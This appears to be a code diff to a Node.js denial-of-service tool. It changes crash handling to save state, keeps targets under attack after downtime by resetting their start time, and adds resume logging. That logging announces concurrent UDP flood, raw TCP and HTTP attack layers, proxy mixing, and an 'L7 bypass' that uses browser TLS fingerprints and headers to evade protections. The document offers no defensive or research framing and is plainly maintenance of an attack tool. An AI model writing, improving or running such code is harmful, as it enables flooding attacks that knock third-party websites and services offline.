@@ -28,8 +28,10 @@ const L7_BYPASS = process.env.L7_BYPASS !== "false";
 
 
 process.on('uncaughtException', (err) => {
-  try { console.error(colors.red(`[FATAL] Uncaught Exception: ${err.message}`)); } catch {}
-  
+  try {
+    saveNow();
+    console.error(colors.red(`[FATAL] Uncaught Exception: ${err.message}`));
+  } catch {}
 });
 
 process.on('unhandledRejection', (reason) => {
@@ -531,8 +533,8 @@ if (state.statusCounts && typeof state.statusCounts === "object") {
 }
 
 if (currentTarget && currentTarget.startTime && Date.now() - currentTarget.startTime >= currentTarget.duration) {
-  console.log(colors.yellow(`Target duration expired: ${currentTarget.url}`));
-  currentTarget = null;
+  console.log(colors.yellow(`Target duration expired during downtime — resetting start time: ${currentTarget.url}`));
+  currentTarget.startTime = Date.now();
 }
 if (!currentTarget && targetQueue.length > 0) {
   currentTarget = targetQueue.shift();
@@ -822,10 +824,23 @@ const stopAttack = async () => {
 const resumeAttack = async () => {
   if (!continueAttack || !currentTarget) return;
   console.log(colors.yellow(`Resuming attack on: ${currentTarget.url}`));
-  console.log(colors.cyan(`Queue length: ${targetQueue.length}/${MAX_QUEUE}`));
   lastSuccessTime = Date.now();
 
   const proxies = loadProxies();
+
+  
+  console.log(colors.green(`\nAttack Resumed: ${currentTarget.url}`));
+  console.log(colors.cyan(`Threads: ${numThreads} | Req/cycle: ${REQUESTS_PER_CYCLE}`));
+  if (proxies.length) console.log(colors.magenta(`Proxies: ${proxies.length} available — randomly mixed with direct connections`));
+  if (USE_UDP) console.log(colors.red("UDP FLOOD: ON"));
+  if (USE_RAW_TCP) console.log(colors.red("RAW TCP: ON"));
+  if (KEEP_ALIVE) console.log(colors.cyan("Keep-Alive: ON"));
+  if (L7_BYPASS) console.log(colors.magenta("L7 BYPASS: ON (browser TLS fingerprints + Sec-* headers + cookie persistence + jitter)"));
+  console.log(colors.green("ALL ATTACK LAYERS RUNNING CONCURRENTLY (L4 UDP + L4 TCP + L7 HTTP)"));
+  if (tunnelActive && nportUrl) console.log(colors.magenta(`Public: ${nportUrl}`));
+  console.log(colors.cyan(`Queue length: ${targetQueue.length}/${MAX_QUEUE}`));
+  console.log("");
+
   activeThreads = [];
   threadTypes.clear();
   let threadId = 0;
@@ -841,8 +856,9 @@ const resumeAttack = async () => {
     }
     activeThreads.push(i);
   }
-  console.log(colors.green(`Resumed with ${activeThreads.length} threads${proxies.length ? ' (direct + proxies mixed)' : ' (direct)'}`));
+  console.log(colors.green(`Resumed with ${threadId} threads${proxies.length ? ' (direct + proxies mixed)' : ' (direct)'}`));
   startWatchdog();
+  startStatusDisplay();
 };
 
 const autoStartTunnel = async () => {
